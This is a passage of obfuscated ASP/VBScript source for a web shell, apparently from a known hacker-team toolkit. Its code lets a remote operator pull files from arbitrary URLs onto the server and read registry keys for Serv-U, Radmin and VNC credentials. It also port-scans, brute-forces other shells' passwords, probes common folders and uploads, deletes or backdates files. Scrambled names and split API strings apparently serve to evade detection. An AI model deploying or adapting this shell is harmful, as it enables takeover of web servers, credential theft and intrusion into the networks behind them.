tfgd wrtc,"<font color=""red"">Script encrypted</font>"
bwzb=True
End If
If rhk(content,"<script\s*(.|\n)*?runat\s*=\s*""?server""?(.|\n)*?>")Then
tfgd wrtc,"Found <font color=""red"">"&HtmlEncode("<script runat=""server"">")&"</font>"
bwzb=True
End If
If rhk(content,"[^\.]\bExecute\b")Then
tfgd wrtc,"Found <font color=""red"">Execute()</font> function"
bwzb=True
End If
If rhk(content,"[^\.]\bExecuteGlobal\b")Then
tfgd wrtc,"Found <font color=""red"">ExecuteGlobal()</font> function"
bwzb=True
End If
If jxi=1 Then wlgu=svayg(content,"<!--\s*#include\s+(file|virtual)\s*=\s*.*-->",False)(0)
If wlgu<>""Then
wlgu=svayg(wlgu,"[/\w]+\.[\w]+",False)(0)
If wlgu=""Then 
tfgd wrtc,"Can't get include file"
bwzb=True
Else
tfgd wrtc,"Included file <font color=""blue"">"&wlgu&"</font>"
bwzb=True
End If
End If
End If
If bwzb Then
eps"<hr>"
Response.Flush()
End If
Next
For Each dieec In theFolder.SubFolders
znxg(dieec)
Next
afqj(Err)
End Sub
Sub tfgd(wrtc,xbq)
girbw"<li><u><a href=""javascript:uivh('unv','kdl','"&rdeb(wrtc.Path)&"')"">"&wrtc.Path&"</a></u><font color=#9900FF>"&wrtc.DateLastModified&"</font>-<font color=#009966>"&crl(wrtc.size)&"</font>-"&xbq&"</li>"
Response.Flush()
End Sub
Sub iqhtx()
If Not isDebugMode Then On Error Resume Next
If pccem=""Then pccem=ebyut
Dim glt,oxywb,wdh
glt="HK"&qzloh&"LM\SYSTEM\Current"&fzhwc&"ControlSet\Services\Serv"&dwtpl&"-U-Counters\Performance\Library|HK"&qzloh&"LM\SYSTEM\Current"&fzhwc&"ControlSet\Services\Serv"&dwtpl&"-U\ImagePath|HK"&qzloh&"LM\SOFT"&yitz&"WARE\Cat Soft\Serv"&dwtpl&"-U\Domains\DomainList\DomainList|HK"&qzloh&"LM\SYSTEM\Rad"&lmk&"min\v2.0\Server\Parameters\Parameter|HK"&qzloh&"LM\SYSTEM\Rad"&lmk&"min\v2.0\Server\Parameters\Port|HK"&qzloh&"LM\SYSTEM\Rad"&lmk&"min\v2.0\Server\Parameters\NTAu"&tae&"thEnabled|HK"&qzloh&"LM\SYSTEM\Rad"&lmk&"min\v2.0\Server\Parameters\Filter"&mwegb&"Ip|HK"&qzloh&"LM\SYSTEM\Rad"&lmk&"min\v2.0\Server\iplist\0|HKEY_LOCAL_MACHINE\SOFT"&yitz&"WARE\RealVNC\WinVNC4\|HK"&qzloh&"LM\SOFT"&yitz&"WARE\Microsoft\Windows\CurrentVers"&xyu&"ion\Winlog"&cjn&"on\Dont-DisplayLastUser"&pfysl&"Name|HK"&qzloh&"LM\SYSTEM\Current"&fzhwc&"ControlSet\Control\Lsa\restrictanonymous|HK"&qzloh&"LM\SYSTEM\Current"&fzhwc&"ControlSet\Services\Lanm"&rzdqp&"anServer\Parameters\Aut"&mec&"oShareServer|HK"&qzloh&"LM\SYSTEM\Current"&fzhwc&"ControlSet\Services\Lanm"&rzdqp&"anServer\Parameters\EnableSharedNetDr"&ucfzc&"ives|HK"&qzloh&"LM\SYSTEM\Current"&fzhwc&"ControlSet\Services\Tcpip\Parameters\EnableSecurityFilt"&vqd&"ers|HK"&qzloh&"LM\SYSTEM\ControlSet0"&wbmfm&"01\Services\Tcpip\Parameters\IPEnableRouter|HK"&qzloh&"LM\SYSTEM\ControlSet0"&wbmfm&"01\Services\Tcpip\Enum\Count|HK"&qzloh&"LM\SYSTEM\ControlSet0"&wbmfm&"01\Services\Tcpip\Linkage\Bind(NIC ID)|HK"&qzloh&"LM\SYSTEM\Current"&fzhwc&"ControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\Defaul"&toe&"tGateway(Replace with the NIC ID)|HK"&qzloh&"LM\SYSTEM\Current"&fzhwc&"ControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\Name"&nqv&"Server(Replace with the NIC ID)"
wdh="x:\|x:\Program Files|x:\Program Files\Serv"&dwtpl&"-U|x:\Program Files\RhinoSoft.com|x:\Program Files\Rad"&lmk&"min|x:\Program Files\Mysql|x:\Program Files\mail|x:\Program Files\winwebmail|x:\Documents and Settings\All Users|x:\Documents and Settings\All Users\Documents|x:\Documents and Settings\All Users\Start Menu\Programs|x:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere|x:\Serv"&dwtpl&"-U|x:\Rad"&lmk&"min|x:\Mysql|x:\mail|x:\winwebmail|x:\soft|x:\tools|x:\windows\temp"
wdh=Replace(wdh,"|",Chr(13)&Chr(10))
swz"Action Others"
sdy True
bkljo"wrfse","tdm"
girbw"<b>Download to server</b><br>"
gns"100%"
las 1
sze"text","yrzp","http://","80%","",""
zbja"Download","20%"
byu
las 0
sze"text","pccem",pccem,"","",""
eps"<td>"
sztyg"checkbox","pheb",2,"",""
girbw"Overwrite"
byu
vlpr
ylm
gns"100%"
eps"<hr>"
sdy True
bkljo"wrfse","rdfb"
girbw"<b>Reg read</b><br>"
gns"100%"
las 1
sze"text","jte","HK"&qzloh&"LM\SYSTEM\Current"&fzhwc&"ControlSet\Control\ComputerNa"&egp&"me\ComputerNa"&egp&"me\ComputerNa"&egp&"me","80%","",""
zbja"Get","20%"
byu
vlpr
ylm
picvp"RegInfo",True
fsuo
For Each strRegInfo In Split(glt,"|")
If InStr(strRegInfo,"(")>0 Then
HrefRegInfo=zznke(strRegInfo,"(",True)
Else
HrefRegInfo=strRegInfo
End If
eps"<li><a href=""javascript:mhvec('"&rdeb(HrefRegInfo)&"')"">"&strRegInfo&"</a>"
Next
eps"</ul></span><hr>"
sdy True
bkljo"wrfse","cjb"
girbw"<b>Port scan</b><br>"
gns"100%"
las 1
doTd"Scan IP","20%"
sze"text","iih","127.0.0.1","60%","",""
zbja"Scan","20%"
byu
las 0
doTd"Port List","20%"
sze"text","xqx","21,23,80,1433,1521,3306,3389,4899,439"&zqcgg&"58,65500","80%","",2
byu
vlpr
ylm
eps"<hr>"
sdy True
bkljo"wrfse","vgky"
girbw"<b>Mini shell crack</b><br>"
gns"100%"
las 1
doTd"Url","20%"
sze"text","yrzp","http://","60%","",""
zbja"Start","20%"
byu
las 0
doTd"Dic","20%"
sze"text","seux","value,fuck,#,|,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,~,!,@,*,$","80%","",2
byu
vlpr
ylm
eps"<hr>"
sdy True
bkljo"wrfse","vfpj"
girbw"<b>Common path probe</b><br>"
gns"100%"
las 1
doTd"Paths","20%"
ldnv"qdq",wdh,8
zbja"Start","20%"
byu
vlpr
ylm
Select Case wrfse
Case"tdm"
eps"<hr>"
licv()
Case"rdfb"
eps"<hr>"
soms()
Case"cjb"
eps"<hr>"
adsop()
Case"vgky"
eps"<hr>"
ohbrw()
Case"vfpj"
eps"<hr>"
xval()
End Select
End Sub
Sub licv()
If Not isDebugMode Then On Error Resume Next
Dim uknq,nvj,bncj
Set bncj=phthe("Ad"&lvs&"odb.S"&lwn&"tream")
uknq=tqml(yrzp,"/")
If InStr(pccem,".")<1 Then pccem=pccem&"\"&uknq
fygv.Open"GET",yrzp,False
fygv.send
kbc(Err)
If pheb<>2 Then
pheb=1
End If
With bncj
.Type=1
.Mode=3
.Open
.Write fygv.ResponseBody
.Position=0
Execute "bncj.Saveto"&viuws&"File pccem,pheb"
.Close
End With
If Err then
afqj(Err)
Else
eps"Download succeeded"
End If
End Sub
Sub soms()
If Not isDebugMode Then On Error Resume Next
Dim i,pccem,zajvx,wummm
eps "<b>Key : </b>"&jte&"<br>"
Execute "zajvx=opnsd.RegRea"&xpor&"d(jte)"
If IsArray(zajvx)Then
wummm=""
For i=0 To UBound(zajvx)
If IsNumeric(zajvx(i))Then
If CInt(zajvx(i))<16 Then
wummm=wummm&"0"
End If
wummm=wummm&CStr(Hex(CInt(zajvx(i))))
Else
wummm=wummm&zajvx(i)
End If
Next
eps "<b>Value : </b>"&wummm
Else
eps "<b>Value : </b>"&zajvx
End If
afqj(Err)
End Sub
Sub adsop()
If Not isDebugMode Then On Error Resume Next
If Not rhk(iih,"^((\d{1,3}\.){3}(\d{1,3}),)*(\d{1,3}\.){3}(\d{1,3})$")Then
eps "Invalid IP format"
smeb
End If
If Not rhk(xqx,"^(\d{1,5},)*\d{1,5}$")Then
eps "Invalid port format"
smeb
End If
eps "Scanning...<br>"
Response.Flush()
For Each tmpip In Split(iih,",")
For Each tmpPort In Split(xqx,",")
nilb tmpip,tmpPort
Next
Next
End Sub
Sub nilb(dwfu, mnlq)
On Error Resume Next
Dim conn,gdxq
set conn=phthe("Ad"&lvs&"odb.Connect"&tzf&"ion")
gdxq="Provider=SQLOLEDB.1;Data Source="&dwfu&","&mnlq&";User ID=lake2;Password=;"
conn.ConnectionTimeout=1
conn.open gdxq
If Err Then
If Err.number=-2147217843 or Err.number=-2147467259 Then
If InStr(Err.description,"(Connect()).")>0 Then
eps"<label>"&dwfu&":"&mnlq&"</label><label>close</label><br>"
Else
eps"<label>"&dwfu&":"&mnlq&"</label><label><font color=red>open</font></label><br>"
End If
Response.Flush()
End If
End If
End Sub
Sub ohbrw()
If Not isDebugMode Then On Error Resume Next
eps"Cracking...<br>"
Response.Flush()
For Each strPass In Split(seux,",")
If InStr(ouc(yrzp&"?"&qnku(strPass)&"="&qnku("response.write ""Fucked!""")),"Fucked!")>0 Then
eps"Password is <font color=red>"&strPass&"</font> ^_^"
smeb
End If
Next
eps"Crack failed,RPWT ?"
afqj(Err)
End Sub
Sub xval()
If Not isDebugMode Then On Error Resume Next
Dim jclir
eps"Path detected will be shown below:<br>"
qdq=Replace(qdq,"x:\","")
For Each drive In tyz.Drives
For Each ckxz In Split(qdq,Chr(13)&Chr(10))
Execute "jclir=drive.DriveL"&jze&"etter&"":\""&ckxz"
If tyz.FolderExists(jclir)Then
eps"<li><a href=""javascript:uivh('unv','','"&rdeb(jclir)&"')"">"&jclir&"</></li>"
Response.Flush()
End If
Next
Next
afqj(Err)
End Sub
Sub mqd()
Response.Cookies(uoe)=""
Response.Redirect(tics&"?goaction="&showLogin)
End Sub
Sub swz(ucg)
%>
<html>
<head>
<title><%=adsnp%></title>
<style type="text/css">
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.main{width:100%;padding:20px 20px 20px 20px;}
.hidehref{font:12px Arial,Tahoma;color:#646464;}
.input{font:12px Arial,Tahoma;background:#fff;height:20px;BORDER-TOP-WIDTH:1px;BORDER-LEFT-WIDTH:1px;BORDER-BOTTOM-WIDTH:1px;BORDER-RIGHT-WIDTH:1px;}
.text{font:12px Arial,Tahoma;background:#fff;BORDER-TOP-WIDTH:1px;BORDER-LEFT-WIDTH:1px;BORDER-BOTTOM-WIDTH:1px;BORDER-RIGHT-WIDTH:1px;}
.tdInput{font:12px Arial,Tahoma;background:#fff;padding:1px;height:20px;BORDER-TOP-WIDTH:1px;BORDER-LEFT-WIDTH:1px;BORDER-BOTTOM-WIDTH:1px;BORDER-RIGHT-WIDTH:1px;width:100%;}
.text{font:12px Arial,Tahoma;background:#fff;padding:1px;}
.tdText{font:12px Arial,Tahoma;background:#fff;padding:1px;width:100%;}
.area{font:12px 'Courier New',Monospace;background:#fff;border: 1px solid #666;padding:2px;}
a{color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1Span{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:2px 10px 2px 5px;width:100%;height:28px}
.alt0Span{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:2px 10px 2px 5px;width:100%;height:28px}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:2px 10px 2px 5px;height:28px}
.alt0 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:2px 10px 2px 5px;height:28px}
.focusTr td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ddddff;padding:2px 10px 2px 5px;height:28px}
.head td{border-top:1px solid #ccc;border-bottom:1px solid #bbb;background:#e0e0e0;padding:5px 10px 5px 5px;font-weight:bold;}
.headSpan{border-top:1px solid #fff;margin:2;background:#e0e0e0;width:100%;}
form{margin:0;padding:0;}
.bt{border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:23px;padding:3px 5px 5px 5px;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:50%;margin-right:10px;}
label{font:12px Arial,Tahoma;float:left;width:25%;}
</style>
<script language="javascript">
function tibl(str){
return escape(str);
}
</script>
<script language="vbscript">
Function auxbp(obj)
If obj.style.display="none"Then
obj.style.display=""
Else
obj.style.display="none"
End If
End Function
Function uivh(lkzrc,gfi,Str)
On Error Resume Next
Dim ieq
actForm.goaction.value=lkzrc
actForm.wrfse.value=gfi
If (lkzrc="unv"Or lkzrc="cfh")And InStr(Str,":\")<1 And Str<>"" Then Str=fsrst.value&Str
actForm.kwnoj.value=wvxe(Str)
Select Case gfi
Case"pjz"
upform.action="<%=tics%>?goaction="&lkzrc&"&wrfse="&gfi&"&pccem="&tibl(wvxe(upform.pccem.value))&"&gkkk="&tibl(Mid(upform.file.Value,InstrRev(upform.file.Value,"\")+1))
If upform.pheb.checked Then
upform.action=upform.action&"&pheb=1"
End If
upform.submit()
Case"xxtu","kru","syu","rlebx","qylng","kco","lpr"
Select Case gfi
Case"syu","kru"
ieq=InputBox("Move to :","Move",Left(Str,InstrRev(Str,"\")))
Case"rlebx","xxtu"
ieq=InputBox("Copy to :","Copy",Left(Str,InstrRev(Str,"\")))
Case"qylng","kco"
ieq=InputBox("Rename as :","Rename",Mid(Str,InstrRev(Str,"\")+1))
If gfi="qylng"Then
Do While InStr(ieq,".")<1 And ieq<>""
ieq=InputBox("Invalid file name format!","Rename","")
Loop
End If
Case Else
ieq=InputBox("Modify as :","Modify time","")
End Select
If ieq=""Then Exit Function
actForm.kwnoj.value=wvxe(Str&"|"&ieq)
actForm.submit()
Case"qlmkp","zgxy"
If Window.confirm("Delete?Are you sure?")Then actForm.submit()
Case Else
actForm.submit()
End Select
End Function
Function wvxe(bxmgw)
If Not <%=needEncode%> Or bxmgw=""Then
wvxe=bxmgw
Exit Function
End If
Dim tt,zhj
tt=""
For i=1 To Len(bxmgw)
zhj=Mid(bxmgw,i,1)
If Asc(zhj)<128 And Asc(zhj)>0 then
tt=tt&Asc(zhj)+<%=encodeNum%>&"<%=encodeCut%>"
Else
tt=tt&zhj&"<%=encodeCut%>"
End If
Next
wvxe=Left(tt,Len(tt)-1)
End Function
Function immm(gbdi)
On Error Resume Next
Dim pamArr
pamArr=Split("<%=pamtoEncode%>","|")
For Each strPam In pamArr
On Error Resume Next:Execute gbdi&"."&strPam&".value=wvxe("&gbdi&"."&strPam&".value)"
Next
End Function
Function vnkh(gfi,gdxq,okxlt,simo,funx)
sqlForm.wrfse.value=gfi
If gdxq<>""Then
If InStr(1,gdxq,"PROVIDER=",1)<1 Then gdxq="<%=fne("")%>"&fsrst.value&gdxq
sqlForm.gdxq.value=gdxq
End If
sqlForm.gdxq.value=wvxe(sqlForm.gdxq.value)
sqlForm.okxlt.value=wvxe(okxlt)
sqlForm.simo.value=wvxe(simo)
sqlForm.funx.value=funx
sqlForm.submit()
End Function
Function btpb(server,user,pass,db)
form1.gdxq.value="PROVIDER=SQLOLEDB;DATA SOURCE="&server&";UID="&user&";PWD="&pass&";DATABASE="&db&""
End Function
Function mhvec(str)
form2.jte.value=str
End Function
Function acidi(dbpath)
form1.gdxq.value="<%=fne("")%>"&dbpath
End Function
</script>
</head>
<body style="margin:0;table-layout:fixed; word-break:break-all;"bgcolor="#f9f9f9">
<table width="100%"border="0"cellpadding="0"cellspacing="0">
<tr class="head">
<td style="width:30%"><br><%=mzbu("LOCAL_ADDR")&"("&uszcs&")"%></td>
<td align="center" style="width:40%"><br>
<b><%pyzxc adsnp,"#0099FF","3"%></b><br>
</td>
<td style="width:30%"align="right"><%=cwner()%></td>
</tr>
<form id="actForm"method="post"action="<%=tics%>">
<input type="hidden" id="goaction" name="goaction" value="">
<input type="hidden" id="wrfse" name="wrfse" value="">
<input type="hidden" id="kwnoj" name="kwnoj" value="">
</form>
<form id="sqlForm"method="post"action="<%=tics%>">
<input type="hidden" id="goaction" name="goaction" value="drowk">
<input type="hidden" id="wrfse" name="wrfse" value="">
<input type="hidden" id="gdxq" name="gdxq" value="<%=gdxq%>">
<input type="hidden" id="okxlt" name="okxlt" value="">
<input type="hidden" id="simo" name="simo" value="">
<input type="hidden" id="funx" name="funx" value="">
</form>
<%
If yxndg() Then
%>
<tr class="alt1">
<td colspan="3">
<a href="javascript:uivh('jaz','','');">Server Info</a> | 
<a href="javascript:uivh('pgvr','','');">Object Info</a> | 
<a href="javascript:uivh('olgk','','');">User Info</a> | 
<a href="javascript:uivh('smsap','','');">C-S Info</a> | 
<a href="javascript:uivh('wanmc','','');">WS Execute</a> | 
<a href="javascript:uivh('unv','','');">FSO File</a> | 
<a href="javascript:uivh('cfh','','');">App File</a> | 
<a href="javascript:uivh('drowk','','');">Ms DataBase</a> | 
<a href="javascript:uivh('nuwf','','');">File Packager</a> | 
<a href="javascript:uivh('kpnff','','');">File Searcher</a> | 
<a href="javascript:uivh('qkdm','','');">ServU Up</a> | 
<a href="javascript:uivh('itzvh','','');">Scan Shells</a> | 
<a href="javascript:uivh('abjw','','');">Some others...</a> | 
<a href="javascript:uivh('Logout','','');">Logout</a> | 
</td>
</tr>
<%
End If
%></table><div class="main"><br>
<%
eps"<b>"
pyzxc ucg&"&raquo;","#0099ff","2"
girbw"</b><br><br>"
End Sub
Sub jpyyx()
Dim qkoqw
qkoqw=zznke(mzbu("PATH_INFO"),"/",False)
eps ouc("http://"&uszcs&qkoqw&"/"&fToPre&"?"&mzbu("QUERY_STRING"))
Response.status=fygv.status
response.End
End Sub
Sub zgnr(blu,yklhu)
Dim nlrn
If Not isDebugMode Then On Error Resume Next
eps"<li><u>"&blu
If yklhu<>""Then
eps"(Object "&yklhu&")"
End If
eps"</u>"
Set nlrn=phthe(blu)
If Err<>-2147221005 Then
pyzxc HtmlEncode("Enabled  "),"green",""
eps"adsnp:"&nlrn.adsnp&";"
eps"About:"&nlrn.About
Else
pyzxc HtmlEncode("Disabled"),"red",""
End If
eps"</li>"
If Err Then
Err.Clear
End If
Set nlrn=Nothing
End Sub
Sub dtx(qhtxx)
Dim User,mvkq,lkp
If Not isDebugMode Then On Error Resume Next
Set User=getObj("WinNT://./"&qhtxx&",user")
mvkq=User.Get("UserFlags")
lkp=User.LastLogin
las 0
kgsj"Description","20%"
kgsj User.Description,"80%"
byu
las 1
kgsj"Belong to",""
kgsj wvk(qhtxx),""
byu
las 0
kgsj"Password expired","20%"
kgsj CBool(User.Get("Password"&gnh&"Expired")),"80%"
byu
las 1
kgsj"Password never expire",""
kgsj cbool(mvkq And&H10000),""
byu
las 0
kgsj"Can't change password",""
kgsj cbool(mvkq And&H00040),""
byu
las 1
kgsj"Global-group account",""
kgsj cbool(mvkq And&H100),""
byu
las 0
kgsj"Password length at least",""
Execute "kgsj User.Password"&yof&"MinimumLength,"""""
byu
las 1
kgsj"Password required",""
kgsj User.PasswordRequired,""
byu
las 0
kgsj"Account disabled",""
Execute "kgsj User.Account"&zzm&"Disabled,"""""
byu
las 1
kgsj"Account locked",""
Execute "kgsj User.IsAcc"&seta&"ountLocked,"""""
byu
las 0
kgsj"User profile",""
kgsj User.Profile,""
byu
las 1
kgsj"User loginscript",""
kgsj User.LoginScript,""
byu
las 0
kgsj"Home directory",""
kgsj User.HomeDirectory,""
byu
las 1
kgsj"Home drive",""
kgsj User.Get("Hom"&jvwt&"eDirDrive"),""
byu
las 0
kgsj"Last login",""
kgsj lkp,""
byu
If Err Then Err.Clear
End Sub
Function wvk(qhtxx)
Dim edi,mtxkk
Set edi=getObj("WinNT://./"&qhtxx&",user")
For Each mtxkk in edi.Groups
wvk=wvk&" "&mtxkk.Name
Next
End Function
Function nvxs(pccem)
Execute "Set objCountFile=tyz.O"&vrs&"penTextFile(pccem,1,True)"
nvxs=objCountFile.ReadAll
objCountFile.Close
Set objCountFile=Nothing
End Function
Function qea(pccem)
Dim bncj
If Not isDebugMode Then On Error Resume Next
Set bncj=phthe("Ad"&lvs&"odb.S"&lwn&"tream")
With bncj
.Type=2
.Mode=3
.Open
.LoadFromFile pccem
If wrfse="eoxxk" Then
.Charset="utf-8"
Else
.Charset=defaultChr
End If
.Position=2
qea=.ReadText()
.Close
End With
Set bncj=Nothing
End Function
Sub xww(pccem,gvr)
Dim bncj
If Not isDebugMode Then On Error Resume Next
Set bncj=phthe("Ad"&lvs&"odb.S"&lwn&"tream")
With bncj
.Type=2
.Mode=3
.Open
If wrfse="pus" Then
.Charset="utf-8"
Else
.Charset=defaultChr
End If
.WriteText gvr
.SavetoFile pccem,2
.Close
End With
Set bncj=Nothing
End Sub
Sub kwys(pccem,gvr)
Dim theFile
Execute "Set theFile=tyz.Open"&gkz&"TextFile(pccem,2,True)"
theFile.Write gvr
theFile.Close
Set theFile=Nothing
End Sub
Sub ndgx()
If Not isDebugMode Then On Error Resume Next
If ekek="file"Then
pccem=pccem&"\"&olg
Execute "Call tyz.CreateTex"&kfuaj&"tFile(pccem,False)"
kdl
Else
Execute "tyz.CreateFolde"&owyt&"r(pccem&""\""&olg)"
End If
If Err Then
afqj(Err)
Else
sqvg"File/folder created"
End If
End Sub
Sub xpz()
Dim euk,dieec,qfaqh,wvy
If Not isDebugMode Then On Error Resume Next
pccem=zznke(kwnoj,"|",False)
euk=tqml(kwnoj,"|")
If InStr(pccem,"\")<1 Then pccem=pccem&"\"
Dim theFile,fileName,theFolder
If pccem=""Or euk=""Then
sqvg"Parameter wrong!"
Exit Sub
End If
If mea="fso"Then
If wrfse="renamefolder"Then
Set theFolder=tyz.GetFolder(pccem)
theFolder.Name=euk
Set theFolder=Nothing
Else
Set theFile=tyz.GetFile(pccem)
theFile.Name=euk
Set theFile=Nothing
End If
Else
wvy=tqml(pccem,"\")
qfaqh=zznke(pccem,"\",False)
Execute "Set dieec=aeh.NameSpac"&vcf&"e(qfaqh)"
Set fvz=dieec.ParseName(wvy)
fvz.Name=euk
End If
If Err Then
afqj(Err)
Else
sqvg"Rename completed"
End If
End Sub
Sub fqws()
If Not isDebugMode Then On Error Resume Next
If wrfse="zgxy"Then
Execute "Call tyz.DeleteF"&xupo&"older(pccem,True)"
Else
Execute "Call tyz.Delete"&epipt&"File(pccem,True)"
End If
If Len(pccem)=2 Then pccem=pccem&"\"
If Err Then
afqj(Err)
Else
sqvg"File/folder deleted"
End If
End Sub
Sub maijt()
Dim bjys,drb,kxx,tlxl,tlifo
If Not isDebugMode Then On Error Resume Next
pccem=Left(kwnoj,Instr(kwnoj,"|")-1)
drb=Mid(kwnoj,InStr(kwnoj,"|")+1)
If pccem=""Or drb=""Then
sqvg"Parameter wrong!"
Exit Sub
End If
If Right(drb,1)<>"\"Then drb=drb&"\"
Select Case wrfse
Case"xxtu"
Execute "Call tyz.CopyFol"&dce&"der(pccem,drb)"
Case"rlebx"
Execute "Call tyz.C"&mso&"opyFile(pccem,drb)"
Case"kru"
Execute "Call tyz.Move"&blgth&"Folder(pccem,drb)"
Case"syu"
Execute "Call tyz.MoveFi"&bgfgr&"le(pccem,drb)"
End Select
If Err Then
afqj(Err)
Else
sqvg"File/folder copyed/moved"
End If
End Sub
Sub lpr()
Dim fbne,stdb,lbh,ejun
If Not isDebugMode Then On Error Resume Next
pccem=Left(kwnoj,Instr(kwnoj,"|")-1)
If Right(pccem,1)="\"And Len(pccem)>3 Then pccem=Left(pccem,Len(pccem)-1)
stdb=tqml(pccem,"\")
lbh=Mid(kwnoj,Instr(kwnoj,"|")+1)
pccem=zznke(pccem,"\",False)
Execute "Set ejun=aeh.NameSpa"&gura&"ce(pccem)"
Set fbne=ejun.ParseName(stdb)
If lbh<>""Then
If IsDate(lbh) Then fbne.ModifyDate=lbh
End If
If Err Then
afqj(Err)
Else
sqvg"Time modiffied"
End If
Set fbne=Nothing
Set ejun=Nothing
End Sub
Sub exfu()
Response.Clear
If Not isDebugMode Then On Error Resume Next
Dim bncj,fileName,pqbrv
fileName=tqml(pccem,"\")
Set bncj=phthe("Ad"&lvs&"odb.S"&lwn&"tream")
bncj.Open
bncj.Type=1
Execute "bncj.LoadFr"&nqfa&"omFile(pccem)"
afqj(Err)
session.CodePage=936
Response.AddHeader"Content-Disposition","Attachment; Filename="&fileName
session.CodePage=65001
Response.AddHeader"Content-Length",bncj.Size
Response.ContentType="Application/Octet-Stream"
Response.BinaryWrite bncj.Read
Response.Flush()
bncj.Close
Set bncj=Nothing
End Sub
Sub zzy()
If Not isDebugMode Then On Error Resume Next
Dim i,j,info,qpswg,theFile,fileName,gvr
If InstrRev(pccem,".")<InstrRev(pccem,"\") Then
If Right(pccem,1)<>"\"Then pccem=pccem&"\"
pccem=pccem&gkkk
End If
If InStr(pccem,":")<1 Then pccem=ebyut&"\"&pccem
Set bncj=phthe("Ad"&lvs&"odb.S"&lwn&"tream")
Set qpswg=phthe("Ad"&lvs&"odb.S"&lwn&"tream")
With bncj
.Type=1
.Mode=3
.Open
.Write Request.BinaryRead(Request.TotalBytes)
.Position=0
gvr=.Read()
i=InStrB(gvr,chrB(13)&chrB(10))
info=LeftB(gvr,i-1)
i=Len(info)+2
i=InStrB(i,gvr,chrB(13)&chrB(10)&chrB(13)&chrB(10))+4-1
j=InStrB(i,gvr,info)-1
qpswg.Type=1
qpswg.Mode=3
qpswg.Open
bncj.position=i
.CopyTo qpswg,j-i-2
If pheb=1 Then
Execute "qpswg.SavetoF"&ewhm&"ile pccem,2"
Else
Execute "qpswg.S"&xrjg&"avetoFile pccem"
End If
If Err Then
afqj(Err)
Else
sqvg"File uploaded"
End If
qpswg.Close
.Close
End With
Set bncj=Nothing
Set qpswg=Nothing
End Sub
Function ouc(aun)
If Not isDebugMode Then On Error Resume Next
fygv.Open"GET",aun,False
fygv.send
psx.Pattern="charset=[\s]?[\w-]+"
If psx.test(fygv.getAllResponseHeaders())Then
pagecharset=Trim(Replace(LCase(psx.Execute(fygv.getAllResponseHeaders())(0)),"charset=",""))
ElseIf psx.test(fygv.responseText)Then
pagecharset=Trim(Replace(LCase(psx.Execute(fygv.responseText)(0)),"charset=",""))
End If
If pagecharset=""Then pagecharset=defaultChr
ouc=ppcc(fygv.responseBody,pagecharset)
End Function
Function yxndg()
If request.cookies(uoe)=""Then
yxndg=False
Exit Function
End If
If mmyo(request.cookies(uoe))<> pass Then
yxndg=False
Else
yxndg=True
End If
End Function
Function wvxe(bxmgw)
If Not needEncode Or bxmgw=""Then
wvxe=bxmgw
Exit Function
End If
Dim tt,zhj
tt=""
For i=1 To Len(bxmgw)
zhj=Mid(bxmgw,i,1)
If Asc(zhj)<128 And Asc(zhj)>0 then
tt=tt&Asc(zhj)+encodeNum&encodeCut
Else
tt=tt&zhj&encodeCut
End If
Next
wvxe=Left(tt,Len(tt)-1)
End Function
Function wzec(gcb)
If Not needEncode Or gcb=""Then
wzec=gcb
Exit Function
End If
Dim dd,idtk
dd=""
idtk=Split(gcb,encodeCut)
For i=0 To UBound(idtk)
If IsNumeric(idtk(i))Then
dd=dd&Chr(CInt(idtk(i))-encodeNum)
Else
dd=dd&idtk(i)
End If
Next
wzec=dd
End Function
Function cwner()
Dim irre,vset,sdih
vset=88
sdih=31
irre="<br>"
irre=irre&"<a href='http://www.vtwo.cn/' target='_blank'>Bink Team</a> | "
irre=irre&"<a href='http://0kee.com/' target='_blank'>0kee Team</a> | "
irre=irre&"<a href='http://www.t00ls.net/' target='_blank'>T00ls</a> | "
irre=irre&"<a href='http://www.helpsoff.com.cn' target='_blank'>Fuck Tencent</a>"
cwner=irre
End Function
Function ppcc(tfixs,dnilb)
If Not isDebugMode Then On Error Resume Next
Dim kdwtq,kqmyb
Set kdwtq=phthe("Ad"&lvs&"odb.S"&lwn&"tream")
With kdwtq
.Type=2
.Open
.WriteText tfixs
.Position=0
.Charset=dnilb
.Position=2
kqmyb=.ReadText(.Size)
.close
End With
Set kdwtq=Nothing
ppcc=kqmyb
End Function
Function mzbu(str)
mzbu=Request.ServerVariables(str)
End Function
Function phthe(ttrwh)
Set phthe=Server.CreateObject(ttrwh)
End Function
Function getObj(ttrwh)
Set getObj=GetObject(ttrwh)
End Function
Function qnku(str)
qnku=server.urlencode(str)
End Function
Function lhs(str)
Dim deox,wley
deox=""
For i=0 To Len(str)-1
wley=Right(str,Len(str)-i)
If Asc(wley)<16 Then deox=deox&"0"
deox=deox&CStr(Hex(Asc(wley)))
Next
lhs="0x"&deox
End Function
Function ojlus(str)
Dim deox,wley
deox=""
For i=0 To Len(str)-1
wley=Right(str,Len(str)-i)
deox=deox&CStr(Hex(Asc(wley)))&"00"
Next
ojlus="0x"&deox
End Function
Function htmlEncode(str)
str=csyf(str)
str=Replace(str,Chr(13)&Chr(10),"<br>")
htmlEncode=Replace(str," ","&nbsp;")
End Function
Function csyf(str)
If str=""Or IsNull(str)Then
csyf=""
Exit Function
End If
csyf=Server.HtmlEncode(str)
End Function
Function gwbw(str)
gwbw=Server.MapPath(str)
End Function
Sub afqj(Err)
If Err Then
sqvg"Exception :"&Err.Description
sqvg"Exception source :"&Err.Source
Err.Clear
End If
End Sub
Function mmyo(ByVal gztjo) 
Dim mbhq 
Dim tyjcj 
Dim aaq 
mbhq=30 
